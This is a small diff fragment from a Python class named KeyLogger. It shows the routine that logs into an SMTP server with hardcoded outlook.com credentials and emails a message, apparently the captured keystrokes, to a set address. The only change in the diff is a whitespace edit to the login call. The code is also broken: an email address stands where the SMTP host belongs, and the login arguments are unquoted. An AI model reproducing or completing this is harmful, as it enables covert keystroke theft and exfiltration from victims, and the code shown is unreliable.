@@ -67,7 +67,7 @@ class KeyLogger:
 
         with smtplib.SMTP('winsupdate00@outlook.com', 587) as server:
             server.starttls()
-            server.login(winsupdate00@outlook.com, Logger1@12)
+            server.login(winsupdate00@outlook.com,Logger1@12)
             server.sendmail(self.email, self.email, msg.as_string())
 
     def report(self):
